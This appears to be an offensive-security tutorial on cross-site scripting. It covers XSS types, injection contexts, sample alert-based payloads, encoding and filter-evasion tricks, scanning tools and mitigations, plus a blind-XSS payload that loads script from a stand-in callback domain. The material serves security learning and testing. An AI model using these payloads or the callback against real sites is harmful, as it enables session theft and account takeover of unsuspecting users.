## Cross-Site Scripting (XSS): Reflected, Stored, & DOM-Based

#### ðŸŒ³ XSS in the Real World:-
An attacker injects malicious JS into a website viewed by other users. This can lead to:
- Session hijacking
- Credential theft
- Defacement
- Malware delivery
- CSRF bypass or pivoting
- Bypassing frontend security controls

Successful exploitation depends on context, output location, and available sinks.


#### ðŸŒ³ 3 Types of XSS:-
Reflected XSS
- The payload is part of the request and reflected in the response.
- Common in search pages, error messages, and redirect parameters.
- Requires user interaction (clicking a crafted link).

Stored XSS
- The payload is saved on the server and served to other users later.
- Found in comments, profile fields, messages.
- More dangerous due to persistence and scale.

DOM-Based XSS
- Exploitation occurs purely in the browser.
- JavaScript in the client uses untrusted input (location, document, etc.) unsafely.
- Not visible in server response; requires JavaScript inspection.


#### ðŸŒ³ Where to Look for XSS:-
Target parameters in:
- URLs: q=, search=, redirect=
- POST bodies and JSON
- HTTP headers: Referer, User-Agent
- HTML input fields
- AJAX responses or dynamic UI updates


#### ðŸŒ³ Context Matters: Injection Points:-
Determine the context:

      HTML Body: <div>PAYLOAD</div>
      Attribute: <input value="PAYLOAD"> 
      JavaScript: <script>var x = "PAYLOAD";</script>
      CSS: <style>body{background:PAYLOAD}</style>
      Event handlers: <a onclick="PAYLOAD">

Payload structure and encoding vary by context.


#### ðŸŒ³ Modern Payload Crafting:- 

Sample payloads:

      "><script>alert(1)</script>
      "><img src=x onerror=alert(1)>
      "><svg/onload=alert(1)>
       <iframe src="javascript:alert(1)">

DOM-based: use #, ?, or nested paths:
    
      example.com/#<script>alert(1)</script>
      example.com/page?input=<img src=x onerror=alert(1)>

Advanced:

     Polyglots ("><script/src=data:...)
     CSP bypass using document.location or setTimeout


#### ðŸŒ³ Tools for Detecting XSS
- XSStrike: Payload generator and context analysis
- DalFox: Fast automated XSS scanner with smart filtering
- XSSHunter (deprecated but cloned): Detects blind XSS
- KXSS: Identifies injectable reflection points
- Burp Suite Pro: Active scanner, Repeater for testing

Manual testing remains critical in bypassing WAFs or filters.


#### ðŸŒ³ XSS Bypasses and Evasion Techniques:-
Common filter bypasses:

    Use alternate quotes: ' vs "
    Add whitespace, tabs, newlines: <scr\nipt>
    Encode payload: %3Cscript%3Ealert(1)%3C/script%3E
    Use data URIs, base64 or blob
    Replace script with svg, math, body, etc.


#### ðŸŒ³ Blind XSS: Exploiting the Unknown:-
Blind XSS occurs when:
- The payload is stored and executed in an internal panel/admin interface.
- You canâ€™t see the result, but your payload calls back (e.g., webhook).

Use payloads like:

    <script src=//yourdomain.xss.ht></script>

Set up an XSS listener (e.g., Interactsh, XSSHunter) to receive pings.


#### ðŸŒ³ Real-World Impacts of XSS:-

XSS is often underestimated, but it enables:
- Account takeover via stolen cookies or session tokens
- Bypass of 2FA via phishing in-app
- Internal pivoting in single-page applications (SPA)
- Browser-based malware delivery
- Targeted attacks on privileged users (admin panels)


#### ðŸŒ³ Mitigation Techniques Youâ€™ll Encounter:-
Secure applications will use:
- Output encoding (HTML, JS, URL)
- SP (Content Security Policy)
- HttpOnly + Secure cookies
- Escaping libraries like DOMPurify
- Framework-level auto-escaping (React, Django, etc.)

Bypass attempts often succeed where developers incorrectly assume built-in protections are enough.
